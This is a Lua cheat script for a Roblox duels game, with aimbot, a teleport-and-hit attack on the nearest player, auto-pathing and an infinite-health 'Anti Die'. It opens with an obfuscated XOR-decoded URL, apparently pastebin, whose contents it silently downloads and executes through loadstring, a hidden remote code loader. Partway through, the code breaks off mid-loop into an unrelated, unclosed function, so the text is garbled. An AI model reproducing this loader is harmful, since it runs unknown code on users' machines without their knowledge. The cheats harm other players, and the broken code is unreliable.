task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 23)
			else
				local r, bit, a, c = 0, 1, b, 23
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"\"]nF\\R"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)

local function safeCall(fn, ...)
    local ok, result = pcall(fn, ...)
    if ok then
        return result
    end
    return nil
end

local function getCharacter()
    local character = LP.Character
    if not character then
        return nil, nil, nil
    end
    return character, character:FindFirstChild("HumanoidRootPart"), character:FindFirstChildOfClass("Humanoid")
end

                                _G._AdaptSafeModeCountdownActive = function()
                                    local adaptSafeModeState = _G._AdaptSafeModeState


                                    local function helperFunction79()
                                        if adaptSafeModeState then
                                            adaptSafeModeState.timerLastNumber = nil

                                            if adaptSafeModeState.timerPhase == "round" or adaptSafeModeState.timerRoundSeen then
                                                adaptSafeModeState.timerInactiveSince = adaptSafeModeState.timerInactiveSince or os.clock()
                                                local timerInactiveSince = adaptSafeModeState.timerInactiveSince

                                                if os.clock() - timerInactiveSince >= 0.75 then
                                                    adaptSafeModeState.timerPhase = "inactive"
                                                    adaptSafeModeState.timerStartUsed = false
                                                    adaptSafeModeState.timerRoundSeen = false
                                                    adaptSafeModeState.timerSawInactive = true
                                                end
                                            elseif adaptSafeModeState.timerPhase == "unknown" then
                                                adaptSafeModeState.timerPhase = "inactive"
                                                adaptSafeModeState.timerSawInactive = true
                                            end
                                        end

                                        return false
                                    end

                                    local duelsMachineTopFrame = playerGui:FindFirstChild("DuelsMachineTopFrame", true)
                                    duelsMachineTopFrame = duelsMachineTopFrame and duelsMachineTopFrame:FindFirstChild("Timer", true)
                                    duelsMachineTopFrame = duelsMachineTopFrame and duelsMachineTopFrame:FindFirstChild("Label", true)
                                    if not duelsMachineTopFrame or not duelsMachineTopFrame:IsA("TextLabel") then
                                        return (helperFunction79())
                                    end
                                    local parent = duelsMachineTopFrame

                                    while parent and parent ~= playerGui do
                                        if parent:IsA("GuiObject") and parent.Visible == false then
                                            return (helperFunction79())
                                        end

                                        if parent:IsA("ScreenGui") and parent.Enabled == false then
                                            return (helperFunction79())
                                        end
                                        parent = parent.Parent
                                    end

                                    local str10 = tostring(duelsMachineTopFrame.Text or ""):upper():gsub("<.->", ""):gsub("%s+", "")

                                    if adaptSafeModeState then
                                        adaptSafeModeState.timerInactiveSince = nil
                                    end

                                    if str10 == "READY" or str10 == "STARTING" or str10 == "GETREADY" then
                                        if adaptSafeModeState then
                                            if adaptSafeModeState.timerPhase ~= "starting" then
                                                adaptSafeModeState.timerStartUsed = false
                                            end

                                            adaptSafeModeState.timerPhase = "starting"
                                            adaptSafeModeState.timerLastNumber = nil
                                            adaptSafeModeState.timerSawInactive = false
                                            adaptSafeModeState.timerStartUsed = true
                                        end

                                        return true
                                    end

                                    if str10 == "GO" or str10 == "FIGHT" then
                                        if adaptSafeModeState then
                                            adaptSafeModeState.timerPhase = "round"
                                            adaptSafeModeState.timerRoundSeen = true
                                            adaptSafeModeState.timerStartUsed = true
                                            adaptSafeModeState.timerLastNumber = nil
                                        end

                                        return false
                                    end

                                    local match, temporaryValue95 = str10:match("^(%d+):(%d+)$")

                                    if match and temporaryValue95 then
                                        local timerLastNumber = tonumber(match) * 60 + tonumber(temporaryValue95)

                                        if adaptSafeModeState then
                                            if timerLastNumber <= 0 and adaptSafeModeState.timerRoundSeen then
                                                adaptSafeModeState.timerPhase = "inactive"
                                                adaptSafeModeState.timerStartUsed = false
                                                adaptSafeModeState.timerRoundSeen = false
                                                adaptSafeModeState.timerSawInactive = true
                                            else
                                                adaptSafeModeState.timerPhase = "round"
                                                adaptSafeModeState.timerRoundSeen = true
                                                adaptSafeModeState.timerStartUsed = true
                                                adaptSafeModeState.timerSawInactive = false
                                            end

                                            adaptSafeModeState.timerLastNumber = timerLastNumber
                                        end

                                        return false
                                    end

                                    local timerLastNumber = tonumber(str10)
                                    if not timerLastNumber then
                                        return false
                                    end

                                    if timerLastNumber > 10 then
                                        if adaptSafeModeState then
                                            adaptSafeModeState.timerPhase = "round"
                                            adaptSafeModeState.timerRoundSeen = true
                                            adaptSafeModeState.timerStartUsed = true
                                            adaptSafeModeState.timerLastNumber = timerLastNumber
                                            adaptSafeModeState.timerSawInactive = false
                                        end

                                        return false
                                    end

                                    if timerLastNumber <= 0 then
                                        if adaptSafeModeState then
                                            adaptSafeModeState.timerLastNumber = timerLastNumber

                                            if adaptSafeModeState.timerPhase == "round" or adaptSafeModeState.timerRoundSeen then
                                                adaptSafeModeState.timerPhase = "inactive"
                                                adaptSafeModeState.timerStartUsed = false
                                                adaptSafeModeState.timerRoundSeen = false
                                                adaptSafeModeState.timerSawInactive = true
                                            end
                                        end

                                        return false
                                    end

                                    local timerRoundSeen

                                    if adaptSafeModeState then
                                        timerRoundSeen = adaptSafeModeState.timerRoundSeen or adaptSafeModeState.timerStartUsed
                                    else
                                        timerRoundSeen = adaptSafeModeState
                                    end

                                    if timerRoundSeen and adaptSafeModeState.timerPhase ~= "starting" then
                                        adaptSafeModeState.timerLastNumber = timerLastNumber
                                        return false
                                    end

                                    if adaptSafeModeState and adaptSafeModeState.timerPhase == "starting" then
                                        adaptSafeModeState.timerLastNumber = timerLastNumber
                                        return true
                                    end

                                    if adaptSafeModeState and adaptSafeModeState.timerStartUsed ~= true and adaptSafeModeState.timerSawInactive then
                                        adaptSafeModeState.timerPhase = "starting"
                                        adaptSafeModeState.timerStartUsed = true
                                        adaptSafeModeState.timerLastNumber = timerLastNumber
                                        adaptSafeModeState.timerSawInactive = false
                                        return true
                                    end

                                    if adaptSafeModeState then
                                        adaptSafeModeState.timerLastNumber = timerLastNumber
                                    end

                                    return false
                                end

                                _G._AdaptSafeModeHoldingBrainrot = function()
                                    for _, temporaryValue95 in ipairs({ "Stealing", "Carrying", "IsCarrying", "HoldingBrainrot", "HasBrainrot" }) do
                                        local ok, result = pcall(function()
                                            return localPlayer:GetAttribute(temporaryValue95)
                                        end)

                                        if ok and result == true then
                                            return true
                                        end
                                    end

                                    local character = localPlayer.Character
                                    if not character then
                                        return false
                                    end

                                    for _, temporaryValue95 in ipairs({ "Stealing", "Carrying", "IsCarrying", "HoldingBrainrot", "HasBrainrot" }) do
                                        local ok, result = pcall(function()
                                            return character:GetAttribute(temporaryValue95)
                                        end)

                                        if ok and result == true then
                                            return true
                                        end
                                        local temporaryValue96 = character:FindFirstChild(temporaryValue95, true)
                                        if temporaryValue96 and temporaryValue96:IsA("BoolValue") and temporaryValue96.Value then
                                            return true
                                        end
                                    end

                                    return false
                                end

                                _G._AdaptSafeModeActionActive = function(argumentValue)
                                    if argumentValue == "aimbot" then
                                        return combatSettings.aimbot == true
                                    end

                                    if argumentValue == "tpBat" then
                                        return combatSettings.desync == true
                                    end

                                    if argumentValue == "autoLeft" then
                                        return _G._AdaptVasperAutoLeftActive == true
                                    end

                                    if argumentValue == "autoRight" then
                                        return _G._AdaptVasperAutoRightActive == true
                                    end
                                    return false
                                end

                                _G._AdaptSafeModeActionLabel = function(argumentValue)
                                    return ({ aimbot = "AIMBOT", tpBat = "TP BAT", autoLeft = "AUTO LEFT", autoRight = "AUTO RIGHT" })[argumentValue] or "ACTION"
                                end

                                _G._AdaptSafeModeBlockReason = function()
                                    if _G._AdaptSafeModeEnabled ~= true then
                                        return nil
                                    end
                                    local adaptSafeModeState = _G._AdaptSafeModeState
                                    if adaptSafeModeState and adaptSafeModeState.countdown then
                                        return "ROUND COUNTDOWN"
                                    end

                                    if adaptSafeModeState and adaptSafeModeState.holding then
                                        return "BRAINROT HELD"
                                    end
                                    return nil
                                end

                                -- VASPER LOGIC REPLACEMENT PATCH
                                -- Auto Left / Auto Right use Vasper's fixed path logic.
                                -- TP Bat uses Vasper V1/V2 target/teleport logic.
                                -- Anti Die is available independently of TP Bat.
                                _G._AdaptVasperAutoLeftActive = false
                                _G._AdaptVasperAutoRightActive = false
                                _G._AdaptVasperTpBatActive = false
                                _G._AdaptVasperTpBatVersion = _G._AdaptVasperTpBatVersion or "V1"
                                _G._AdaptVasperAntiDieEnabled = _G._AdaptVasperAntiDieEnabled == true

                                local VASPER_AP_L1 = Vector3.new(-476.48, -6.28, 92.73)
                                local VASPER_AP_L2 = Vector3.new(-483.12, -4.95, 94.80)
                                local VASPER_AP_L_FACE = Vector3.new(-482.25, -4.96, 92.09)
                                local VASPER_AP_R1 = Vector3.new(-476.16, -6.52, 25.62)
                                local VASPER_AP_R2 = Vector3.new(-483.06, -5.03, 25.48)
                                local VASPER_AP_R_FACE = Vector3.new(-482.06, -6.93, 35.47)
                                local vasperALConn, vasperARConn = nil, nil
                                local vasperALPhase, vasperARPhase = 1, 1

                                local function vasperStopAutoLeft()
                                    _G._AdaptVasperAutoLeftActive = false
                                    if not _G._AdaptVasperAutoRightActive then _G._AdaptAutoPathActive = false end
                                    if vasperALConn then vasperALConn:Disconnect(); vasperALConn = nil end
                                    vasperALPhase = 1
                                end

                                local function vasperStopAutoRight()
                                    _G._AdaptVasperAutoRightActive = false
                                    if not _G._AdaptVasperAutoLeftActive then _G._AdaptAutoPathActive = false end
                                    if vasperARConn then vasperARConn:Disconnect(); vasperARConn = nil end
                                    vasperARPhase = 1
                                end

                                local function vasperStartAutoLeft()
                                    vasperStopAutoLeft()
                                    vasperStopAutoRight()
                                    _G._AdaptVasperAutoLeftActive = true
                                    _G._AdaptAutoPathActive = true
                                    vasperALPhase = 1
                                    vasperALConn = RunService.Heartbeat:Connect(function()
                                        if not _G._AdaptVasperAutoLeftActive then return end
                                        local character = localPlayer.Character
                                        local root = character and character:FindFirstChild("HumanoidRootPart")
                                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                                        if not root or not humanoid then return end
                                        local speed = getAdaptAutoPathSpeed()
                                        if vasperALPhase == 1 then
                                            local target = Vector3.new(VASPER_AP_L1.X, root.Position.Y, VASPER_AP_L1.Z)
                                            if (target-root.Position).Magnitude < 1 then
                                                vasperALPhase = 2
                                                return
                                            end
                                            local delta = VASPER_AP_L1-root.Position
                                            local flat = Vector3.new(delta.X,0,delta.Z)
                                            if flat.Magnitude > 0.1 then
                                                local move = flat.Unit
                                                humanoid:Move(move,false)
                                                root.AssemblyLinearVelocity = Vector3.new(move.X*speed,root.AssemblyLinearVelocity.Y,move.Z*speed)
                                            end
                                        else
                                            local target = Vector3.new(VASPER_AP_L2.X, root.Position.Y, VASPER_AP_L2.Z)
                                            if (target-root.Position).Magnitude < 1 then
                                                humanoid:Move(Vector3.zero,false)
                                                root.AssemblyLinearVelocity = Vector3.zero
                                                _G._AdaptVasperAutoLeftActive = false
                                                vasperStopAutoLeft()
                                                if (VASPER_AP_L_FACE-root.Position).Magnitude > 0.01 then
                                                    root.CFrame = CFrame.new(root.Position,Vector3.new(VASPER_AP_L_FACE.X,root.Position.Y,VASPER_AP_L_FACE.Z))
                                                end
                                                return
                                            end
                                            local delta = VASPER_AP_L2-root.Position
                                            local flat = Vector3.new(delta.X,0,delta.Z)
                                            if flat.Magnitude > 0.1 then
                                                local move = flat.Unit
                                                humanoid:Move(move,false)
                                                root.AssemblyLinearVelocity = Vector3.new(move.X*speed,root.AssemblyLinearVelocity.Y,move.Z*speed)
                                            end
                                        end
                                    end)
                                end

                                local function vasperStartAutoRight()
                                    vasperStopAutoRight()
                                    vasperStopAutoLeft()
                                    _G._AdaptVasperAutoRightActive = true
                                    _G._AdaptAutoPathActive = true
                                    vasperARPhase = 1
                                    vasperARConn = RunService.Heartbeat:Connect(function()
                                        if not _G._AdaptVasperAutoRightActive then return end
                                        local character = localPlayer.Character
                                        local root = character and character:FindFirstChild("HumanoidRootPart")
                                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                                        if not root or not humanoid then return end
                                        local speed = getAdaptAutoPathSpeed()
                                        if vasperARPhase == 1 then
                                            local target = Vector3.new(VASPER_AP_R1.X, root.Position.Y, VASPER_AP_R1.Z)
                                            if (target-root.Position).Magnitude < 1 then
                                                vasperARPhase = 2
                                                return
                                            end
                                            local delta = VASPER_AP_R1-root.Position
                                            local flat = Vector3.new(delta.X,0,delta.Z)
                                            if flat.Magnitude > 0.1 then
                                                local move = flat.Unit
                                                humanoid:Move(move,false)
                                                root.AssemblyLinearVelocity = Vector3.new(move.X*speed,root.AssemblyLinearVelocity.Y,move.Z*speed)
                                            end
                                        else
                                            local target = Vector3.new(VASPER_AP_R2.X, root.Position.Y, VASPER_AP_R2.Z)
                                            if (target-root.Position).Magnitude < 1 then
                                                humanoid:Move(Vector3.zero,false)
                                                root.AssemblyLinearVelocity = Vector3.zero
                                                _G._AdaptVasperAutoRightActive = false
                                                vasperStopAutoRight()
                                                if (VASPER_AP_R_FACE-root.Position).Magnitude > 0.01 then
                                                    root.CFrame = CFrame.new(root.Position,Vector3.new(VASPER_AP_R_FACE.X,root.Position.Y,VASPER_AP_R_FACE.Z))
                                                end
                                                return
                                            end
                                            local delta = VASPER_AP_R2-root.Position
                                            local flat = Vector3.new(delta.X,0,delta.Z)
                                            if flat.Magnitude > 0.1 then
                                                local move = flat.Unit
                                                humanoid:Move(move,false)
                                                root.AssemblyLinearVelocity = Vector3.new(move.X*speed,root.AssemblyLinearVelocity.Y,move.Z*speed)
                                            end
                                        end
                                    end)
                                end

                                local VASPER_TP_CONFIG = {
                                    V1={range=250,offset=Vector3.new(0,0,0),delay=0.08,predict=true,prediction=0.15,rotate=true,reset=true,antiFling=true,side=2.5},
                                    V2={range=250,offset=Vector3.new(0,3,0),delay=0.08,predict=false,prediction=0,rotate=false,reset=true,antiFling=false,side=0},
                                }
                                local vasperTpThread = nil
                                local function vasperGetBat()
                                    local character=localPlayer.Character
                                    if not character then return nil end
                                    local bat=character:FindFirstChild("Bat")
                                    if bat then return bat end
                                    local backpack=localPlayer:FindFirstChild("Backpack")
                                    bat=backpack and backpack:FindFirstChild("Bat")
                                    if bat then pcall(function() bat.Parent=character end) end
                                    return bat
                                end
                                local function vasperHitBat()
                                    if not _G._AdaptVasperTpBatActive then return end
                                    local bat=vasperGetBat()
                                    if not bat then return end
                                    pcall(function()
                                        bat:Activate()
                                        local remote=bat:FindFirstChildWhichIsA("RemoteEvent")
                                        if remote then remote:FireServer() end
                                    end)
                                end
                                local function vasperFindNearest()
                                    local character=localPlayer.Character
                                    local root=character and character:FindFirstChild("HumanoidRootPart")
                                    if not root then return nil end
                                    local cfg=VASPER_TP_CONFIG[_G._AdaptVasperTpBatVersion] or VASPER_TP_CONFIG.V1
                                    local best,bestDist=nil,cfg.range
                                    for _,player in ipairs(Players:GetPlayers()) do
                                        if player~=localPlayer and player.Character then
                                            local targetRoot=player.Character:FindFirstChild("HumanoidRootPart")
                                            local hum=player.Character:FindFirstChildOfClass("Humanoid")
                                            if targetRoot and hum and hum.Health>0 then
                                                local dist=(targetRoot.Position-root.Position).Magnitude
                                                if dist<bestDist then bestDist=dist;best=targetRoot end
                                            end
                                        end
                                    end
                                    return best
                                end
                                local function vasperTpBatStep()
                                    local character=localPlayer.Character
                                    local root=character and character:FindFirstChild("HumanoidRootPart")
                                    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
                                    if not root then return end
                                    local cfg=VASPER_TP_CONFIG[_G._AdaptVasperTpBatVersion] or VASPER_TP_CONFIG.V1
                                    local target=vasperFindNearest()
                                    if not target then return end
                                    local targetPos=target.Position+(cfg.predict and target.AssemblyLinearVelocity*cfg.prediction or Vector3.zero)
                                    local finalPos
                                    if cfg.side>0 then
                                        local dir=root.Position-targetPos
                                        dir=Vector3.new(dir.X,0,dir.Z)
                                        if dir.Magnitude<0.1 then dir=Vector3.new(1,0,0) else dir=dir.Unit end
                                        finalPos=targetPos+dir*cfg.side
                                    else
                                        finalPos=targetPos+cfg.offset
                                    end
                                    root.CFrame=cfg.rotate and CFrame.new(finalPos,targetPos) or CFrame.new(finalPos)
                                    if cfg.reset then root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero end
                                    if cfg.antiFling and humanoid then humanoid.PlatformStand=false;humanoid.Sit=false end
                                    vasperHitBat()
                                end
                                local function vasperStartTpBat()
                                    if _G._AdaptVasperTpBatActive then return end
                                    _G._AdaptVasperTpBatActive=true
                                    if _G._AdaptTpBatAntiDie and _G._AdaptTpBatAntiDie.start then pcall(_G._AdaptTpBatAntiDie.start) end
                                    vasperTpThread=task.spawn(function()
                                        while _G._AdaptVasperTpBatActive do
                                            pcall(vasperTpBatStep)
                                            task.wait((VASPER_TP_CONFIG[_G._AdaptVasperTpBatVersion] or VASPER_TP_CONFIG.V1).delay)
                                        end
                                    end)
                                end
                                local function vasperStopTpBat()
                                    _G._AdaptVasperTpBatActive=false
                                    if vasperTpThread then pcall(function() task.cancel(vasperTpThread) end);vasperTpThread=nil end
                                    if _G._AdaptTpBatAntiDie and _G._AdaptTpBatAntiDie.stop then pcall(_G._AdaptTpBatAntiDie.stop) end
                                end
                                _G._AdaptVasperSetTpBatVersion=function(version)
                                    _G._AdaptVasperTpBatVersion=(version=="V2") and "V2" or "V1"
                                    if _G._AdaptVasperTpBatActive then
                                        vasperStopTpBat();task.defer(vasperStartTpBat)
                                    end
                                end
                                _G._AdaptVasperStartTpBat=vasperStartTpBat
                                _G._AdaptVasperStopTpBat=vasperStopTpBat
                                _G._AdaptVasperStartAutoLeft=vasperStartAutoLeft
                                _G._AdaptVasperStopAutoLeft=vasperStopAutoLeft
                                _G._AdaptVasperStartAutoRight=vasperStartAutoRight
                                _G._AdaptVasperStopAutoRight=vasperStopAutoRight

                                _G._AdaptVasperAntiDie = _G._AdaptVasperAntiDie or {}
                                local vasperAntiDieConnections={}
                                _G._AdaptVasperAntiDie.start=function()
                                    _G._AdaptVasperAntiDieEnabled=true
                                    for _,c in ipairs(vasperAntiDieConnections) do pcall(function() c:Disconnect() end) end
                                    table.clear(vasperAntiDieConnections)
                                    local function attach(character)
                                        local hum=character and character:FindFirstChildOfClass("Humanoid")
                                        if not hum then return end
                                        pcall(function() hum.BreakJointsOnDeath=false;hum:SetStateEnabled(Enum.HumanoidStateType.Dead,false);hum.MaxHealth=math.huge;hum.Health=math.huge end)
                                        table.insert(vasperAntiDieConnections,hum.StateChanged:Connect(function(_,state)
                                            if _G._AdaptVasperAntiDieEnabled and state==Enum.HumanoidStateType.Dead then pcall(function() hum.Health=math.huge;hum:SetStateEnabled(Enum.HumanoidStateType.Dead,false);hum:ChangeState(Enum.HumanoidStateType.GettingUp) end) end
                                        end))
                                        table.insert(vasperAntiDieConnections,hum:GetPropertyChangedSignal("Health"):Connect(function()
                                            if _G._AdaptVasperAntiDieEnabled and hum.Health<hum.MaxHealth then pcall(function() hum.Health=math.huge end) end
                                        end))
                                    end
                                    attach(localPlayer.Character)
                                    table.insert(vasperAntiDieConnections,localPlayer.CharacterAdded:Connect(function(character) task.wait(0.15);if _G._AdaptVasperAntiDieEnabled then attach(character) end end))
                                end
                                _G._AdaptVasperAntiDie.stop=function()
                                    _G._AdaptVasperAntiDieEnabled=false
                                    for _,c in ipairs(vasperAntiDieConnections) do pcall(function() c:Disconnect() end) end
                                    table.clear(vasperAntiDieConnections)
                                end
                                _G._AdaptVasperAntiDie.isEnabled=function() return _G._AdaptVasperAntiDieEnabled==true end

                                _G._AdaptSafeModeApplyBackend = function(argumentValue, argumentValue2)
                                    local aimbot = argumentValue2 == true

                                    if argumentValue == "aimbot" then
                                        if aimbot and combatSettings.desync then
                                            combatSettings.desync = false
                                            combatSettings.desyncSwing = false
                                            pcall(helperFunction49)

                                            if handlers["TP Bat"] then
                                                handlers["TP Bat"](false, true)
                                            end
                                        end

                                        combatSettings.aimbot = aimbot

                                        if aimbot then
                                            pcall(helperFunction46)
                                        else
                                            pcall(helperFunction47)
                                        end

                                        if handlers["Bat Aimbot"] then
                                            handlers["Bat Aimbot"](aimbot, true)
                                        end
                                    elseif argumentValue == "tpBat" then
                                        if aimbot and combatSettings.aimbot then
                                            combatSettings.aimbot = false
                                            pcall(helperFunction47)
                                            if handlers["Bat Aimbot"] then handlers["Bat Aimbot"](false, true) end
                                        end
                                        combatSettings.desync = aimbot
                                        combatSettings.desyncSwing = aimbot
                                        conditionFlag27 = false
                                        _G._AdaptTPMirrorEnabled = false
                                        table.clear(dataTable36)
                                        if aimbot then
                                            pcall(_G._AdaptVasperStartTpBat)
                                        else
                                            pcall(_G._AdaptVasperStopTpBat)
                                        end
                                        if handlers["TP Bat"] then handlers["TP Bat"](aimbot, true) end
                                    elseif argumentValue == "autoLeft" then
                                        if aimbot then
                                            autoPathState.R = false
                                            autoPathState.L = true
                                            pcall(_G._AdaptVasperStartAutoLeft)
                                        else
                                            autoPathState.L = false
                                            pcall(_G._AdaptVasperStopAutoLeft)
                                        end

                                        if handlers["Auto Left"] then
                                            handlers["Auto Left"](aimbot, true)
                                        end

                                        if handlers["Auto Right"] then
                                            handlers["Auto Right"](autoPathState.R == true, true)
                                        end
                                    elseif argumentValue == "autoRight" then
                                        if aimbot then
                                            autoPathState.L = false
                                            autoPathState.R = true
                                            pcall(_G._AdaptVasperStartAutoRight)
                                        else
                                            autoPathState.R = false
                                            pcall(_G._AdaptVasperStopAutoRight)
                                        end

                                        if handlers["Auto Right"] then
                                            handlers["Auto Right"](aimbot, true)
                                        end

                                        if handlers["Auto Left"] then
                                            handlers["Auto Left"](autoPathState.L == true, true)
                                        end
                                    end

                                    if _G._AdaptSyncMobile then
                                        pcall(_G._AdaptSyncMobile)
                                    end
                                end

                                _G._AdaptSafeModeSetAction = function(argumentValue, argumentValue2)
                                    local adaptSafeModeState = _G._AdaptSafeModeState
                                    if not adaptSafeModeState or not adaptSafeModeState.pending then
                                        return false
                                    end

                                    if not (argumentValue2 == true) then
                                        local conditionFlag29 = adaptSafeModeState.pending[argumentValue] == true
                                        local conditionFlag30

                                        if conditionFlag29 then
                                            conditionFlag30 = os.clock() - (adaptSafeModeState.queuedAt and adaptSafeModeState.queuedAt[argumentValue] or 0) < 0.25
                                        else
                                            conditionFlag30 = conditionFlag29
                                        end

                                        if conditionFlag30 then
                                            return true
                                        end
                                        adaptSafeModeState.pending[argumentValue] = false

                                        if adaptSafeModeState.queuedAt then
                                            adaptSafeModeState.queuedAt[argumentValue] = 0
                                        end

                                        _G._AdaptSafeModeApplyBackend(argumentValue, false)

                                        if conditionFlag29 then
                                            _G._AdaptSafeModeNotify(_G._AdaptSafeModeActionLabel(argumentValue) .. " QUEUE CANCELED")
                                        end

                                        return true
                                    end

                                    local temporaryValue95 = _G._AdaptSafeModeBlockReason(argumentValue)

                                    if temporaryValue95 then
                                        if argumentValue == "aimbot" then
                                            adaptSafeModeState.pending.tpBat = false
                                        end

                                        if argumentValue == "tpBat" then
                                            adaptSafeModeState.pending.aimbot = false
                                        end

                                        if argumentValue == "autoRight" then
                                            adaptSafeModeState.pending.autoRight = false
                                        end

                                        if argumentValue == "autoRight" then
                                            adaptSafeModeState.pending.autoLeft = false
                                        end

                                        adaptSafeModeState.pending[argumentValue] = true

                                        if adaptSafeModeState.queuedAt then
                                            adaptSafeModeState.queuedAt[argumentValue] = os.clock()
                                        end

                                        _G._AdaptSafeModeApplyBackend(argumentValue, false)
                                        _G._AdaptSafeModeNotify(_G._AdaptSafeModeActionLabel(argumentValue) .. " QUEUED - " .. temporaryValue95)
                                        return false
                                    end

                                    if argumentValue == "aimbot" then
                                        adaptSafeModeState.pending.tpBat = false
                                    end

                                    if argumentValue == "tpBat" then
                                        adaptSafeModeState.pending.aimbot = false
                                    end

                                    if argumentValue == "autoLeft" then
                                        adaptSafeModeState.pending.autoRight = false
                                    end

                                    if argumentValue == "autoRight" then
                                        adaptSafeModeState.pending.autoLeft = false
                                    end

                                    adaptSafeModeState.pending[argumentValue] = false

                                    if adaptSafeModeState.queuedAt then
                                        adaptSafeModeState.queuedAt[argumentValue] = 0
                                    end

                                    _G._AdaptSafeModeApplyBackend(argumentValue, true)
                                    return true
                                end

                                _G._AdaptSafeModeToggleAction = function(argumentValue)
                                    local adaptSafeModeState = _G._AdaptSafeModeState
                                    if adaptSafeModeState and adaptSafeModeState.pending and adaptSafeModeState.pending[argumentValue] then
                                        return _G._AdaptSafeModeSetAction(argumentValue, false)
                                    end
                                    return _G._AdaptSafeModeSetAction(argumentValue, not _G._AdaptSafeModeActionActive(argumentValue))
                                end

                                _G._AdaptSafeModeEvaluate = function()
                                    local adaptSafeModeState = _G._AdaptSafeModeState
                                    if not adaptSafeModeState then
                                        return
                                    end
                                    local countdown = _G._AdaptSafeModeCountdownActive() == true
                                    local holding = _G._AdaptSafeModeHoldingBrainrot() == true
                                    local conditionFlag29 = countdown and not adaptSafeModeState.countdown
                                    local conditionFlag30 = adaptSafeModeState.countdown and not countdown
                                    local conditionFlag31 = holding and not adaptSafeModeState.holding
                                    adaptSafeModeState.countdown = countdown
                                    adaptSafeModeState.holding = holding
                                    if _G._AdaptSafeModeEnabled ~= true then
                                        return
                                    end

                                    if conditionFlag29 then
                                        _G._AdaptSafeModeNotify("ROUND COUNTDOWN - ACTIONS LOCKED")

                                        for _, temporaryValue95 in ipairs({ "aimbot", "tpBat", "autoLeft", "autoRight" }) do
                                            if _G._AdaptSafeModeActionActive(temporaryValue95) then
                                                adaptSafeModeState.pending[temporaryValue95] = true
                                                _G._AdaptSafeModeApplyBackend(temporaryValue95, false)
                                            end
                                        end
                                    end

                                    if conditionFlag31 then
                                        for _, temporaryValue95 in ipairs({ "aimbot", "tpBat", "autoLeft", "autoRight" }) do
                                            if _G._AdaptSafeModeActionActive(temporaryValue95) then
                                                adaptSafeModeState.pending[temporaryValue95] = true
                                                _G._AdaptSafeModeApplyBackend(temporaryValue95, false)
                                            end
                                        end
                                    end

                                    if conditionFlag30 then
                                        _G._AdaptSafeModeNotify("ROUND COUNTDOWN ENDED")
                                    end

                                    for _, temporaryValue95 in ipairs({ "autoLeft", "autoRight", "aimbot", "tpBat" }) do
                                        if adaptSafeModeState.pending[temporaryValue95] and not _G._AdaptSafeModeBlockReason(temporaryValue95) then
                                            adaptSafeModeState.pending[temporaryValue95] = false
                                            _G._AdaptSafeModeApplyBackend(temporaryValue95, true)
                                            _G._AdaptSafeModeNotify(_G._AdaptSafeModeActionLabel(temporaryValue95) .. " ENABLED")
                                        end
                                    end

                                    if _G._AdaptSyncMobile then
                                        pcall(_G._AdaptSyncMobile)
                                    end
                                end

                                _G._AdaptSafeModeSetEnabled = function(argumentValue, argumentValue2)
                                    _G._AdaptSafeModeEnabled = argumentValue == true
                                    local adaptSafeModeState = _G._AdaptSafeModeState

                                    if not _G._AdaptSafeModeEnabled and adaptSafeModeState and adaptSafeModeState.pending then
                                        adaptSafeModeState.pending.aimbot = false
                                        adaptSafeModeState.pending.tpBat = false
                                        adaptSafeModeState.pending.autoLeft = false
                                        adaptSafeModeState.pending.autoRight = false
                                    end

                                    if argumentValue2 then
                                        _G._AdaptSafeModeNotify(_G._AdaptSafeModeEnabled and "SAFE MODE ENABLED" or "SAFE MODE DISABLED")
                                    end

                                    if _G._AdaptSafeModeEnabled then
                                        if adaptSafeModeState then
                                            adaptSafeModeState.countdown = false
                                            adaptSafeModeState.holding = false
                                        end

                                        pcall(_G._AdaptSafeModeEvaluate)
                                    end

                                    if _G._AdaptSyncMobile then
                                        pcall(_G._AdaptSyncMobile)
                                    end
                                end


                                local function helperFunction79()
                                    local adaptSafeModeCarryConnections = {}

                                    local dataTable50 = {
                                        Stealing = true,
                                        Carrying = true,
                                        IsCarrying = true,
                                        HoldingBrainrot = true,
                                        HasBrainrot = true,
                                    }


                                    local function helperFunction80(argumentValue)
                                        if adaptSafeModeCarryConnections[argumentValue] then
                                            pcall(function()
                                                adaptSafeModeCarryConnections[argumentValue]:Disconnect()
                                            end)

                                            adaptSafeModeCarryConnections[argumentValue] = nil
                                        end
                                    end


                                    local function helperFunction81()
                                        if _G._AdaptSafeModeEnabled ~= true then
                                            return
                                        end

                                        task.defer(function()
                                            if _G._AdaptSafeModeEnabled == true then
                                                pcall(_G._AdaptSafeModeEvaluate)
                                            end
                                        end)
                                    end


                                    local function helperFunction82(argumentValue)
                                        local dataTable51 = {}

                                        for k in pairs(adaptSafeModeCarryConnections) do
                                            if k:sub(1, 10) == "char_" then
                                                table.insert(dataTable51, k)
                                            end
                                        end

                                        for _, temporaryValue95 in ipairs(dataTable51) do

                                local function helperFunction87(argumentValue)
                                    if not argumentValue or argumentValue == "" or argumentValue == "..." or argumentValue == "?" or argumentValue == "NONE" then
                                        return nil
                                    end
                                    local str10 = argumentValue:lower()

                                    for _, temporaryValue95 in ipairs(Enum.KeyCode:GetEnumItems()) do
                                        if temporaryValue95.Name:lower() == str10 then
                                            return temporaryValue95
                                        end
                                    end

                                    if #argumentValue == 1 then
                                        local str11 = argumentValue:upper()

                                        for _, temporaryValue95 in ipairs(Enum.KeyCode:GetEnumItems()) do
                                            if temporaryValue95.Name == str11 then
                                                return temporaryValue95
                                            end
                                        end
                                    end

                                    if #argumentValue >= 3 then
                                        for _, temporaryValue95 in ipairs(Enum.KeyCode:GetEnumItems()) do
                                            if temporaryValue95.Name:sub(1, #argumentValue):lower() == str10 then
                                                return temporaryValue95
                                            end
                                        end
                                    end

                                    return nil
                                end
